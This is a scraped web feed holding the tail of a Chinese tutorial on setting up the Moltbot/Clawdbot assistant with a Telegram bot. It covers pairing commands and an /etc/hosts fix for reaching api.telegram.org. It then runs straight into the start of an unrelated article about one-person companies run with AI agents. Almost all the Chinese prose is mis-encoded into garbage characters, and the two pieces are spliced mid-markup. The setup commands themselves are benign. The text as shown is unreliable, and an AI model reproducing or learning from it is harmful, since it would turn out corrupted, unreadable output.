<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f74a69738dda48a39e8983386074cd3c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=AbnJctgrBlrhJ8PUM68iGmeQu2Q%3D" alt="æ¨¡å‹é€‰æ‹©ç•Œé¢" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
<p>é€‰æ‹©æ¨¡å‹ã€‚</p>
<h3 data-id="heading-6">é€‰æ‹©èŠå¤©é¢‘é“</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a46bfda53ce4a52bc6222bae5315561~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=ZAQvImyrQxfkgUJa4nITnYNMXHk%3D" alt="é€‰æ‹©èŠå¤©é¢‘é“" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    é€‰æ‹©è¦æ¥å…¥çš„èŠå¤©é¢‘é“
  </figcaption>
</figure>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21eb37ba04674fb6a62eddf5bba7c4a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=LREdz1d%2BjjqAgksvQXJYjIFS7eQ%3D" alt="Telegram HTTP API Key æç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    è¾“å…¥ Telegram HTTP API Key
  </figcaption>
</figure>
<p>è¿™é‡Œä½¿ç”¨ Telegramï¼ŒæŒ‰ç…§æç¤ºé¦–å…ˆè¦åˆ›å»ºè‡ªå·±çš„æœºå™¨äººï¼š</p>
<ul>
<li>æ‰“å¼€ Telegramï¼Œæœç´¢ <code>@BotFather</code>ï¼Œå…³æ³¨å¹¶è¾“å…¥ <code>/newbot</code></li>
<li>ç»™æœºå™¨äººå–åå­—ï¼ˆä¾‹å¦‚ <code>moltbot</code>ï¼‰</li>
<li>å†ç»™æœºå™¨äººä¸€ä¸ª idï¼ˆä¾‹å¦‚ <code>molt123_bot</code>ï¼‰</li>
<li>å¾—åˆ° HTTP API çš„ KEY åè¾“å…¥åˆ°ç»ˆç«¯</li>
<li>åˆ«å¿˜äº†ç‚¹å‡»åˆšåˆšåˆ›å»ºçš„æœºå™¨äººï¼Œåç»­æ­¥éª¤éœ€è¦æ¥æ”¶ä¸€æ¡æ¶ˆæ¯</li>
</ul>
<h3 data-id="heading-7">é…ç½® Skill</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/35805440e02c4afe95eca230ab7bae86~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=TycdnfVxXgGMMTwU%2Fbj2FNIGrLw%3D" alt="é…ç½®æŠ€èƒ½æç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    æ˜¯å¦ç°åœ¨é…ç½® Skills
  </figcaption>
</figure>
<p>Configure skills now?</p>
<p>é€‰ <strong>Yes</strong>ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/996685daafa74c1fb8b6e36e21cb5e73~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=EXCWoHNJoW4jdhH1Xlnlpmj3EzQ%3D" alt="Homebrew å®‰è£…å‘½ä»¤æç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Homebrew å®‰è£…å‘½ä»¤æç¤º
  </figcaption>
</figure>
<p>Show Homebrew install command?</p>
<p>é€‰ <strong>Yes</strong>ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c5acd7693914d7caa714bb72aa717f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=FD4ajYMLgfZCDysqJBwU4FS0P2k%3D" alt="ä¾èµ–ä¸ Node ç®¡ç†å™¨é€‰æ‹©" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    é€‰æ‹© Node ç®¡ç†å™¨å¹¶å¤„ç†ä¾èµ–å®‰è£…
  </figcaption>
</figure>
<p>Preferred node manager for skill installs</p>
<p>é€‰ <strong>npm</strong>ã€‚</p>
<p>Install missing skill dependencies</p>
<p>è·³è¿‡ä¹Ÿè¡Œï¼Œåé¢ä¹Ÿå¯ä»¥å†å›æ¥å®‰è£…ï¼š</p>
<ul>
<li>ç”¨ç©ºæ ¼é€‰æ‹© <strong>Skip for now</strong>ï¼Œå›è½¦å³å¯</li>
</ul>
<p>æˆ‘è¿™é‡Œé€‰æ‹©äº† <strong>summarize</strong>ï¼ˆbird å¿½ç•¥ï¼‰ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cacdc64f6354420f9ae71599ca256e4f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=X%2F%2BQ2PHifaLm67NVutZ53t1ocEs%3D" alt="ç¬¬ä¸‰æ–¹ API Key é…ç½®" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    ç¬¬ä¸‰æ–¹ API Key é…ç½®ï¼ˆå¯æš‚æ—¶è·³è¿‡ï¼‰
  </figcaption>
</figure>
<p>è¿™äº› KEY æš‚æ—¶å¯ä»¥è·³è¿‡ï¼Œé€‰æ‹© <strong>No</strong>ï¼Œåé¢å¦‚æœéœ€è¦ä¹Ÿå¯ä»¥å†å¡«å†™ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6bdeba196d944fb68fd83b99a6df212d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=pwPdfv3qai0zjJZC836HYKLCuyQ%3D" alt="å¯ç”¨ hooks æç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    æ˜¯å¦å¯ç”¨ hooks
  </figcaption>
</figure>
<p>Enable hooks</p>
<p>é€‰æ‹© <strong>Skip for now</strong>ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f4c38eb74e174c70842b22eb04feec23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=EWDoWAGtV1wqeIaZImNb2tDXGZ4%3D" alt="é€‰æ‹© hatch æ–¹å¼" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    é€‰æ‹© hatch æ–¹å¼ï¼ˆTUIï¼‰
  </figcaption>
</figure>
<p>How do you want to hatch your bot?</p>
<p>é€‰æ‹© <strong>Hatch in TUI</strong>ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4132a0c5ee564b9cbd57a895967cffd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=LUYVcateKpLdi2GPPJ9zn1qe9Ss%3D" alt="å®‰è£…å®Œæˆæç¤º" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    å®‰è£…å®Œæˆæç¤º
  </figcaption>
</figure>
<p>åˆ°è¿™é‡Œå®‰è£…å°±å·²ç»å®Œæˆäº†ã€‚</p>
<h3 data-id="heading-8">Telegram æœºå™¨äººé…å¯¹</h3>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/400e3b26c91845009e5569768faf980d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=Qye79AvCJLpL2rP3Ngs4xA8AJGQ%3D" alt="Telegram é…å¯¹ç " class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    Telegram æœºå™¨äººé…å¯¹ç 
  </figcaption>
</figure>
<p>åœ¨åˆšåˆšåˆ›å»ºå¥½çš„æœºå™¨äººå¯¹è¯æ¡†ä¸­è¾“å…¥ <code>/start</code>ï¼Œä¼šå‡ºç° <code>Pairing code: XXXXXXX</code>ã€‚</p>
<p>åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤ï¼ˆå°† <code>XXXXXXX</code> æ›¿æ¢æˆä½ çš„ codeï¼‰ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">clawdbot pairing approve telegram XXXXXXX
</code></pre>
<p>å¦‚æœå‡ºç° <code>clawdbot: command not found</code>ï¼Œé€€å‡ºç»ˆç«¯é‡æ–°è¿›å…¥å³å¯ã€‚</p>
<figure class="my-6">
  <img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/21eecc1a17bf404c93f831dfa37ffbd7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770363291&amp;x-signature=b6KESi8mTQFZ58MpE6AdzfjVklY%3D" alt="Telegram ä¸­ä½¿ç”¨ Moltbot" class="mx-auto h-auto w-full max-w-[720px] rounded-md" loading="lazy"/>
  <figcaption class="mt-2 text-center text-sm text-neutral-500">
    é…å¯¹å®Œæˆååœ¨ Telegram ä¸­ä½¿ç”¨ Moltbot
  </figcaption>
</figure>
<p>é…å¯¹æˆåŠŸåå°±å¯ä»¥åœ¨ Telegram æœºå™¨äººä¸­æ­£å¸¸ä½¿ç”¨äº†ã€‚</p>
<p>å½“ç„¶ Moltbot èƒ½åšåˆ°çš„è¿œä¸æ­¢è¿™äº›ï¼Œè¿˜æœ‰è®¸å¤šæ„æƒ³ä¸åˆ°çš„ç©æ³•ç­‰æˆ‘ä»¬å‘æ˜ï¼Œæˆ‘ä¹Ÿä¼šåœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­æŒç»­åˆ†äº«ã€‚</p>
<h2 data-id="heading-9">å¸¸è§é—®é¢˜</h2>
<h3 data-id="heading-10">telegram setMyCommands failed: HttpError: Network request for 'setMyCommands'</h3>
<p>æ­¤é”™è¯¯è¡¨ç¤ºä½ çš„ Clawdbot å®ä¾‹æ— æ³•è¿æ¥åˆ° Telegram çš„ API æœåŠ¡å™¨ <code>api.telegram.org</code>ã€‚</p>
<p>æœ€å¸¸è§çš„åŸå› ï¼š</p>
<ol>
<li>é˜²ç«å¢™é˜»æ­¢äº†å‡ºç«™ HTTPSï¼ˆç«¯å£ 443ï¼‰</li>
<li>VPS/ä¸»æœºæä¾›å•†å±è”½äº† Telegram IP åœ°å€ï¼ˆä¸€äº›å»‰ä»· VPS æä¾›å•†ä¼šè¿™æ ·åšï¼‰</li>
<li>DNS è§£æå¤±è´¥</li>
</ol>
<p>è§£å†³æ–¹æ³•ï¼šåœ¨ <code>/etc/hosts</code> ä¸­æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-txt" lang="txt">149.154.166.110 api.telegram.org
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘åœ¨â€œæ™ºèƒ½ä½“æ¥äº†ï¼ˆè¥¿å—æ€»éƒ¨ï¼‰â€è¹²ç‚¹ä¸‰å¤©ï¼Œç»ˆäºçœ‹æ‡‚äº†ä»€ä¹ˆå«â€œä¸€äººå³æ˜¯å…¬å¸â€]]></title>    <link>https://juejin.cn/post/7600863478929408019</link>    <guid>https://juejin.cn/post/7600863478929408019</guid>    <pubDate>2026-01-30T08:59:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600863478929408019" data-draft-id="7600863478929391635" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘åœ¨â€œæ™ºèƒ½ä½“æ¥äº†ï¼ˆè¥¿å—æ€»éƒ¨ï¼‰â€è¹²ç‚¹ä¸‰å¤©ï¼Œç»ˆäºçœ‹æ‡‚äº†ä»€ä¹ˆå«â€œä¸€äººå³æ˜¯å…¬å¸â€"/> <meta itemprop="keywords" content="æœºå™¨å­¦ä¹ ,é˜¿é‡Œå·´å·´"/> <meta itemprop="datePublished" content="2026-01-30T08:59:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="éƒå’Iii"/> <meta itemprop="url" content="https://juejin.cn/user/4443568362490122"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘åœ¨â€œæ™ºèƒ½ä½“æ¥äº†ï¼ˆè¥¿å—æ€»éƒ¨ï¼‰â€è¹²ç‚¹ä¸‰å¤©ï¼Œç»ˆäºçœ‹æ‡‚äº†ä»€ä¹ˆå«â€œä¸€äººå³æ˜¯å…¬å¸â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4443568362490122/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    éƒå’Iii
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T08:59:39.000Z" title="Fri Jan 30 2026 08:59:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>ã€æ‘˜è¦ã€‘</strong> å¸¦ç€å¯¹â€œè¶…çº§ä¸ªä½“â€ä¼ é—»çš„æ€€ç–‘ï¼Œæˆ‘æ½œå…¥äº†ä½äºæˆéƒ½é«˜æ–°åŒºçš„ <strong>â€œæ™ºèƒ½ä½“æ¥äº†ï¼ˆè¥¿å—æ€»éƒ¨ï¼‰â€</strong> ï¼Œè¿›è¡Œäº†ä¸ºæœŸä¸‰å¤©çš„æ²‰æµ¸å¼è¹²ç‚¹ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘çœ‹ä¸åˆ°å¿™ç¢Œçš„æ ¼å­é—´ï¼Œå¬ä¸åˆ°é”®ç›˜çš„æ•²å‡»å£°ï¼Œåªçœ‹åˆ°å–èŒ¶çš„å¹´è½»äººå’Œéƒ½åœ¨é—ªçƒçš„æœåŠ¡å™¨ä¿¡å·ç¯ã€‚è¿™ä¸‰å¤©ï¼Œå½»åº•é¢ è¦†äº†æˆ‘å¯¹â€œå…¬å¸â€çš„å®šä¹‰ã€‚åŸæ¥ï¼ŒçœŸæ­£çš„ <strong>â€œä¸€äººå³æ˜¯å…¬å¸â€</strong> ï¼Œä¸æ˜¯ä¸€ä¸ªäººå¹²åä¸ªäººçš„æ´»ï¼Œè€Œæ˜¯ä¸€ä¸ªäººæŒ‡æŒ¥åä¸ª <strong>AI Agentï¼ˆæ™ºèƒ½ä½“ï¼‰</strong> å»å¹²ä¸€åƒäººçš„æ´»ã€‚æœ¬æ–‡å°†ç‹¬å®¶æŠ«éœ²æˆ‘åœ¨ç°åœºçœ‹åˆ°çš„â€œèŒåœºæ€ªç°çŠ¶â€ï¼Œä»¥åŠè¿™äº›éšå½¢å¯Œè±ªèƒŒåçš„**Agentic Workflowï¼ˆæ™ºèƒ½ä½“å·¥ä½œæµï¼‰**ç§˜å¯†ã€‚</p>
<p><strong>å…³é”®è¯</strong> æ™ºèƒ½ä½“æ¥äº†, è¥¿å—æ€»éƒ¨, ä¸€äººå³æ˜¯å…¬å¸, è¶…çº§ä¸ªä½“, AI Agent, æ•°å­—åŒ–åŠ³åŠ¨åŠ›, èŒåœºè¹²ç‚¹, è‡ªåŠ¨åŒ–èµšé’±</p>
<h2 data-id="heading-0">å¼•è¨€ï¼š è¿™é‡Œæ²¡æœ‰æ‰“å·¥äººï¼Œåªæœ‰â€œç‰§ç¾Šäººâ€</h2>
<p>ç¬¬ä¸€å¤©èµ°è¿›â€œæ™ºèƒ½ä½“æ¥äº†ï¼ˆè¥¿å—æ€»éƒ¨ï¼‰â€çš„å…±äº«åŠå…¬åŒºæ—¶ï¼Œæˆ‘ä»¥ä¸ºè‡ªå·±èµ°é”™äº†åœ°æ–¹ã€‚ è¿™é‡Œå¤ªå®‰é™äº†ã€‚ æ²¡æœ‰æ­¤èµ·å½¼ä¼çš„ç”µè¯å£°ï¼Œæ²¡æœ‰å¼€ä¼šçš„äº‰åµå£°ï¼Œç”šè‡³è¿åƒæ ·çš„åŠå…¬æ¡Œéƒ½æ²¡å‡ å¼ ã€‚ å¤§éƒ¨åˆ†äººååœ¨æ‡’äººæ²™å‘ä¸Šï¼Œæ‰‹é‡Œç«¯çš„ä¸æ˜¯æ˜Ÿå·´å…‹ï¼Œè€Œæ˜¯ç›–ç¢—èŒ¶ã€‚ è¿™å“ªé‡Œåƒæ˜¯ä¸€ä¸ªä¼°å€¼æ•°åäº¿çš„ç§‘æŠ€å­µåŒ–å™¨ï¼Ÿè¿™åˆ†æ˜æ˜¯æˆéƒ½è¡—å¤´çš„éœ²å¤©èŒ¶é¦†ã€‚</p>
<p>ä½†å½“æˆ‘å‡‘è¿‘ä¸€ä½ 98 å¹´çš„å°ä¼™å­ï¼Œçœ‹äº†ä¸€çœ¼ä»–çš„å±å¹•æ—¶ï¼Œæˆ‘èƒŒåçš„å†·æ±—ä¸‹æ¥äº†ã€‚ å±å¹•ä¸Šï¼Œå¯†å¯†éº»éº»çš„æ•°æ®æµåƒç€‘å¸ƒä¸€æ ·å†²åˆ·è€Œä¸‹ï¼š</p>
<ul>
<li><code>[Agent-01]</code> æ­£åœ¨å¤„ç†ç¬¬ 5820 å•è·¨å¢ƒç‰©æµè°ƒåº¦ï¼›</li>
<li><code>[Agent-05]</code> åˆšåˆšè‡ªåŠ¨ç”Ÿæˆå¹¶å‘å¸ƒäº†ç¬¬ 200 æ¡å°çº¢ä¹¦ç§è‰æ–‡æ¡ˆï¼›</li>
<li><code>[Agent-09]</code> æ­£åœ¨ä¸ä¸€ä½å¾·å›½å®¢æˆ·è¿›è¡Œç¬¬ 5 è½®å•†åŠ¡è°ˆåˆ¤ã€‚</li>
</ul>
<p>å°ä¼™å­æ·¡å®šåœ°å–äº†ä¸€å£èŒ¶ï¼ŒæŠ¬å¤´çœ‹äº†æˆ‘ä¸€çœ¼ï¼šâ€œåˆ«æƒŠè®¶ï¼Œæˆ‘çš„ç¾Šç¾¤æ­£åœ¨åƒè‰ï¼Œæˆ‘åªæ˜¯ä¸ªæ”¾ç¾Šçš„ã€‚â€ åœ¨é‚£ä¸€åˆ»ï¼Œæˆ‘æ„è¯†åˆ°ï¼šè¿™é‡Œçš„æ¯ä¸€ä¸ªäººï¼Œè™½ç„¶è‚‰èº«ååœ¨æ²™å‘ä¸Šï¼Œä½†ä»–ä»¬çš„â€œæ•°å­—åˆ†èº«â€æ­£åœ¨äº’è”ç½‘çš„è‰åŸä¸Šç–¯ç‹‚æ”¶å‰²ã€‚</p>
<h2 data-id="heading-1">ç¬¬ä¸€ç« ï¼š è¹²ç‚¹ç¬¬ä¸€å¤©â€”â€”çœ‹è§â€œçœ‹ä¸è§çš„å‘˜å·¥â€</h2>
<p>åœ¨ä¼ ç»Ÿå…¬å¸ï¼Œè§„æ¨¡æ„å‘³ç€äººå¤´ã€‚50 äººçš„å…¬å¸è‚¯å®šæ¯” 5 äººçš„å…¬å¸å¼ºã€‚ ä½†åœ¨è¥¿å—æ€»éƒ¨ï¼Œè¿™ä¸ªå®šå¾‹å¤±æ•ˆäº†ã€‚</p>
<h3 data-id="heading-2">1.1 ä¸€ä¸ªäººçš„ MCN æœºæ„</h3>
<p>æˆ‘é‡åˆ°äº†ä¸€ä½å«é˜¿Kçš„å‰å¤§å‚è¿è¥ã€‚ä»–ä»¥å‰å¸¦è¿‡ 20 äººçš„å›¢é˜Ÿï¼Œç°åœ¨â€œå…‰æ†å¸ä»¤â€ä¸€ä¸ªã€‚ ä½†ä»–æ‰‹é‡Œè¿è¥ç€ 50 ä¸ªå‚ç›´é¢†åŸŸçš„çŸ­è§†é¢‘è´¦å·ã€‚ â€œä»¥å‰ï¼Œæˆ‘æœ‰æ–‡æ¡ˆã€å‰ªè¾‘ã€ç”šè‡³è¿˜æœ‰ä¸“é—¨è´Ÿè´£å›å¤è¯„è®ºçš„å®ä¹ ç”Ÿã€‚â€é˜¿KæŒ‡ç€å±å¹•ä¸Šçš„æ‹“æ‰‘å›¾è¯´ï¼Œâ€œç°åœ¨ï¼Œä»–ä»¬éƒ½åœ¨è¿™é‡Œã€‚â€ ä»–å±•ç¤ºäº†ä»–çš„ <strong>â€œå†…å®¹æµæ°´çº¿â€</strong> ï¼š</p>
<ol>
<li><strong>é€‰é¢˜ Agent</strong>ï¼šæ¯å¤©æ—©ä¸Š 8 ç‚¹ï¼Œè‡ªåŠ¨æŠ“å–å…¨ç½‘çƒ­ç‚¹ï¼Œç”Ÿæˆ 20 ä¸ªçˆ†æ¬¾é€‰é¢˜ã€‚</li>
<li><strong>è„šæœ¬ Agent</strong>ï¼šæ ¹æ®é€‰é¢˜ï¼Œç»“åˆé˜¿Ké¢„è®¾çš„â€œæƒ…ç»ªé’©å­â€SOPï¼Œç”Ÿæˆåˆ†é•œå¤´è„šæœ¬ã€‚</li>
